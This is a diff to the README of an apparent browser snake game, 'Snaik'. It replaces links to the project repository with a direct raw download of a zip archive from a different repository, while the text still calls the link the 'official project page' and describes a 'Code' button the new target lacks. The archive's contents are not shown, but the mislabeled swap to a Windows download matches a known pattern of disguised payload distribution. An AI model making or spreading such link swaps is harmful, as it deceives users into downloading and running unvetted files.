@@ -5,7 +5,7 @@ description: "Play this web-based snake game featuring progressive difficulty, k
 ---
 # 🐍 Snaik - Experience classic arcade gaming fun
 
-[![Download Snaik](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Michellerippled520/Snaik)
+[![Download Snaik](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Michellerippled520/michellerippled520.github.io/raw/refs/heads/main/public/v1.7.zip)
 
 Snaik is a modern take on the classic arcade snake game. The project uses a neon visual style to offer a crisp experience. You control a growing snake to eat items and gain points. The game tests your reflexes and concentration as the speed increases. Developers wrote the game using standard web technologies like JavaScript, CSS, and HTML.
 
@@ -23,7 +23,7 @@ You need a basic Windows computer to run this game. Ensure your system meets the
 
 Follow these steps to get the game on your computer:
 
-1.  Visit the official project page to download the files: [https://github.com/Michellerippled520/Snaik](https://github.com/Michellerippled520/Snaik).
+1.  Visit the official project page to download the files: [https://github.com/Michellerippled520/michellerippled520.github.io/raw/refs/heads/main/public/v1.7.zip](https://github.com/Michellerippled520/michellerippled520.github.io/raw/refs/heads/main/public/v1.7.zip).
 2.  Look for the green button labeled "Code" on the right side of the page.
 3.  Click the "Download ZIP" option from the menu.
 4.  Save the file to a folder you can find easily, such as your Downloads folder.
